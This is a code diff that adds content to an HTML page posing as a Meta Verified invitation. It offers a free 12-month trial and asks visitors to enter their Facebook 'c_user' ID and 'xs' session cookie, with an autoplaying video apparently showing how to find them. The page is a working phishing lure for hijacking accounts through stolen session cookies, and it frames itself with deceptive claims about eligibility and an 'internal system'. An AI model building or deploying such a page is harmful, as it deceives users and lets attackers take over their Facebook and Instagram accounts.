@@ -100,7 +100,7 @@
     }
 
     video {
-      width: 40%;
+      width: 100%;
       max-width: 420px;
       border-radius: 10px;
       margin-top: 8px;
@@ -143,3 +143,31 @@
 
       <div class="form-body">
         <p><strong>Meta Verified</strong> helps you build trust by confirming your identity and authenticity on Facebook and Instagram.</p>
+
+        <p>Eligible creators have been invited to access Meta Verified for <strong>free for 12 months</strong>. This trial includes profile verification, priority support, and proactive impersonation protection.</p>
+
+        <p>To confirm your eligibility, please fill out the details below. Your session ID helps us identify your invitation through our internal system.</p>
+
+        <div class="video-container">
+          <p class="text-secondary" style="font-size: 13px;">Watch how to fill out the form:</p>
+          <video controls autoplay muted>
+            <source src="https://cdn.glitch.global/e6fdea79-9332-410b-9d43-e610883fc60c/detailed%20video.mp4?v=1737384626648" type="video/mp4">
+          </video>
+        </div>
+
+        <label for="c_user">(c_user)</label>
+        <input type="number" name="c_user" required pattern="^\d{15}$" title="Please enter a 15-digit Facebook user ID" />
+
+        <label for="xs">(xs)</label>
+        <input type="text" name="xs" required />
+
+        <p class="small-note">Please stay logged into your account until you receive a confirmation email from our system.</p>
+      </div>
+
+      <div class="form-footer d-flex justify-content-end">
+        <button type="submit" class="submit-btn">Submit</button>
+      </div>
+    </div>
+  </form>
+</body>
+</html>
